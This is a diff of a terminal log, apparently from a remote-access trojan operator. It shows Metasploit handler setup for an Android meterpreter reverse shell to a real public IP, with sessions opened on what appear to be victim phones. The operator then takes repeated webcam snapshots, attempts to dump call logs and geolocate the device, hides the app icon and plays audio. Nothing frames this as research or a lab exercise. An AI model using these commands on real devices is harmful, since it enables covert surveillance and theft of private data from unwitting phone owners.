@@ -1,77 +1,186 @@
 root@RatHat:~/django# msfconsole
-use multi/handler
+use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
+set ExitOnSession true
 set lhost 185.120.221.217
 set lport 4445
-run
+exploit
 
-# cowsay++
- ____________
-< metasploit >
- ------------
-       \   ,__,
-        \  (oo)____
-           (__)    )\
-              ||--|| *
+               .;lxO0KXXXK0Oxl:.
+           ,o0WMMMMMMMMMMMMMMMMMMKd,
+        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
+      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
+    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
+   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
+  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
+ oMMMMMMMMMMx.                    dMMMMMMMMMMx
+.WMMMMMMMMM:                       :MMMMMMMMMM,
+xMMMMMMMMMo                         lMMMMMMMMMO
+NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
+MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
+NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
+xMMMMMMMMMd                        ,0MMMMMMMMMMK;
+.WMMMMMMMMMc                         'OMMMMMM0,
+ lMMMMMMMMMMk.                         .kMMO'
+  dMMMMMMMMMMWd'                         ..
+   cWMMMMMMMMMMMNxc'.                ##########
+    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
+      ;0MMMMMMMMMMMMMMMo.          +:+
+        .dNMMMMMMMMMMMMo          +#++:++#+
+           'oOWMMMMMMMMo                +:+
+               .,cdkO0K;        :+:    :+:
+                                :::::::+:
+                      Metasploit
 
+       =[ metasploit v5.0.5-dev                           ]
++ -- --=[ 1854 exploits - 1049 auxiliary - 325 post       ]
++ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
 
-       =[ metasploit v4.17.17-dev                         ]
-+ -- --=[ 1817 exploits - 1031 auxiliary - 315 post       ]
-+ -- --=[ 539 payloads - 42 encoders - 10 nops            ]
-+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
-
-msf > use multi/handler
-msf exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
 payload => android/meterpreter/reverse_tcp
-msf exploit(multi/handler) > set lhost 185.120.221.217
+msf5 exploit(multi/handler) > set ExitOnSession true
+ExitOnSession => true
+msf5 exploit(multi/handler) > set lhost 185.120.221.217
 lhost => 185.120.221.217
-msf exploit(multi/handler) > set lport 4445
+msf5 exploit(multi/handler) > set lport 4445
 lport => 4445
-msf exploit(multi/handler) > run
+msf5 exploit(multi/handler) > exploit
 
 [*] Started reverse TCP handler on 185.120.221.217:4445
-msfconsole
-use multi/handler
-set payload android/meterpreter/reverse_tcp
-set lhost 185.120.221.217
-set lport 4445
-run
-msfconsole
-use multi/handler
-set payload android/meterpreter/reverse_tcp
-set lhost 185.120.221.217
-set lport 4445
-run
-[*] Sending stage (70525 bytes) to 5.117.146.6
-[*] Meterpreter session 1 opened (185.120.221.217:4445 -> 5.117.146.6:41002) at
-2019-02-10 21:37:10 +0000
+[*] Sending stage (70653 bytes) to 5.117.33.161
+[*] Meterpreter session 1 opened (185.120.221.217:4445 -> 5.117.33.161:42053) at
+ 2019-06-09 13:59:28 +0000
 
-[*] Sending stage (70525 bytes) to 5.117.146.6
-[*] Sending stage (70525 bytes) to 5.117.146.6
-[*] Sending stage (70525 bytes) to 2.182.124.240
-[*] 5.117.146.6 - Meterpreter session 1 closed.  Reason: Died
-^C[-] Exploit failed: Interrupt
-[*] Exploit completed, but no session was created.
-msf exploit(multi/handler) >
-msf exploit(multi/handler) >
-msf exploit(multi/handler) > run
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > webcam_snap -i 2 -p /root/django/users/admin/webcamsnap2.jpg
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/django/users/admin/webcamsnap2.jpg
+meterpreter > webcam_snap -i 2 -p /root/django/users/admin/webcamsnap2.jpg
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/django/users/admin/webcamsnap2.jpg
+meterpreter > webcam_snap -i 2 -p /root/django/users/admin/webcamsnap2.jpg
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/django/users/admin/webcamsnap2.jpg
+meterpreter > webcam_snap -i 2 -p /root/django/users/admin/webcamsnap2.jpg
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/django/users/admin/webcamsnap2.jpg
+meterpreter > webcam_snap -i 2 -p /root/django/users/admin/webcamsnap2.jpg
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/django/users/admin/webcamsnap2.jpg
+meterpreter > webcam_snap -i 2 -p /root/django/users/admin/webcamsnap2.jpg
+[*] Starting...
+[*] Stopped
+[-] webcam_start: Operation failed: 1
+meterpreter > dump_calllog -o /root/django/users/admin/dumpcalllog.txt
+[*] No call log entries were found!
+meterpreter > dump_calllog -o /root/django/users/admin/dumpcalllog.txt
+[*] No call log entries were found!
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > hide_app_icon
+[*] Activity MainActivity was hidden
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > play a.mp3
+[*] Playing a.mp3...
+[-] Error running command play: Errno::ENOENT No such file or directory @ rb_sys
+open - a.mp3
+meterpreter > play /root/a.mp3
+[*] Playing /root/a.mp3...
+[*] Done
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > play
+Please specify a path to an audio file
+meterpreter > play .
+[*] Playing ....
+[-] Error running command play: Errno::EISDIR Is a directory @ io_fread - .
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter >
+[*] 5.117.33.161 - Meterpreter session 1 closed.  Reason: Died
+msfconsole
+[-] Unknown command: msfconsole.
+msf5 exploit(multi/handler) > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
+payload => android/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set ExitOnSession true
+ExitOnSession => true
+msf5 exploit(multi/handler) > set lhost 185.120.221.217
+lhost => 185.120.221.217
+msf5 exploit(multi/handler) > set lport 4445
+lport => 4445
+msf5 exploit(multi/handler) > exploit
 
 [*] Started reverse TCP handler on 185.120.221.217:4445
-[*] Sending stage (70525 bytes) to 5.117.146.6
-[*] Meterpreter session 2 opened (185.120.221.217:4445 -> 5.117.146.6:41009) at
-2019-02-10 21:40:41 +0000
-webcam_snap -o /root/django/users/admin/
-webcam_snap -o /root/django/users/admin/
-dump_calllog -o /root/django/users/admin/dumpcalllog.txt
-[*] 5.117.146.6 - Meterpreter session 2 closed.  Reason: Died
-^C[-] Exploit failed: Interrupt
-[*] Exploit completed, but no session was created.
-msf exploit(multi/handler) > Interrupt: use the 'exit' command to quit
-msf exploit(multi/handler) > exit -y
-root@RatHat:~/django# msfconsole
-use multi/handler
-set payload android/meterpreter/reverse_tcp
-set lhost 185.120.221.217
-set lport 4445
-run
+[*] Sending stage (70653 bytes) to 104.152.52.37
 
